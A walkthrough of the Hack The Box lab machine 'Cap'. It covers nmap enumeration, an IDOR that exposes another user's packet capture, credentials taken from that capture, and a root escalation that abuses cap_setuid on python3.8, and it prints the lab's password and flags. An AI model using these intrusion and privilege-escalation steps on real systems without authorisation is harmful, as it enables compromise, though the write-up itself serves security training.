# 📘 Hack The Box: Cap

> 🔗 https://app.hackthebox.com/machines/Cap

---

# 🎯 Goal

Gain initial access through an IDOR vulnerability, extract credentials from a packet capture and escalate privileges to root through Linux Capabilities.

---

# 📑 Table of Contents

- [🧠 Core Idea](#-core-idea)
- [🧩 Theory: IDOR](#-theory-idor)
- [🧩 Theory: PCAP](#-theory-pcap)
- [🧩 Theory: Linux Capabilities](#-theory-linux-capabilities)
- [🔍 Step 1 — Enumeration](#-step-1--enumeration)
- [🌐 Step 2 — Web Application Analysis](#-step-2--web-application-analysis)
- [🔓 Step 3 — IDOR Exploitation](#-step-3--idor-exploitation)
- [📡 Step 4 — PCAP Analysis](#-step-4--pcap-analysis)
- [🐚 Step 5 — Foothold](#-step-5--foothold)
- [⬆️ Step 6 — Privilege Escalation](#-step-6--privilege-escalation)
- [👑 Step 7 — Root Access](#-step-7--root-access)

---

# 🧠 Core Idea

Cap demonstrates how a simple access control flaw can lead to complete system compromise.

Attack chain:

Web → IDOR → PCAP → Credentials → SSH → Capability Abuse → Root

---

# 🧩 Theory: IDOR

IDOR occurs when an application exposes object identifiers without proper authorization checks.

---

# 🧩 Theory: PCAP

PCAP files contain captured network traffic that can be analyzed in Wireshark.

Unencrypted protocols may expose credentials.

---

# 🧩 Theory: Linux Capabilities

Capabilities split root privileges into smaller permissions.

cap_setuid allows changing process UID.

---

# 🔍 Step 1 — Enumeration

```bash
export IP=10.129.21.10
nmap -sC -sV -v $IP
```

Open ports:

21 FTP
22 SSH
80 HTTP

---

# 🌐 Step 2 — Web Application Analysis

Open the Security Dashboard.

Security Snapshot stores captures under:

/data/[id]

This suggests a possible IDOR vulnerability.

---

# 🔓 Step 3 — IDOR Exploitation

Access:

/data/0

A different user's capture becomes available.

---

# 📡 Step 4 — PCAP Analysis

```bash
wireshark 0.pcap
```

Credentials:

USER nathan
PASS Buck3tH4TF0RM3!

---

# 🐚 Step 5 — Foothold

```bash
ssh nathan@TARGET
```

<details>
<summary>🔐 Show Password</summary>

Buck3tH4TF0RM3!

</details>

<details>
<summary>🔐 Show User Flag</summary>

e0f45bef5f9eecde5e15c114c6305f2c

</details>

---

# ⬆️ Step 6 — Privilege Escalation

```bash
getcap -r / 2>/dev/null
```

Result:

/usr/bin/python3.8 = cap_setuid

```python
import os
os.setuid(0)
os.system("/bin/bash")
```

---

# 👑 Step 7 — Root Access

<details>
<summary>🔐 Show Root Flag</summary>

85038ac80672331a1c72019bd26b1af7

</details>
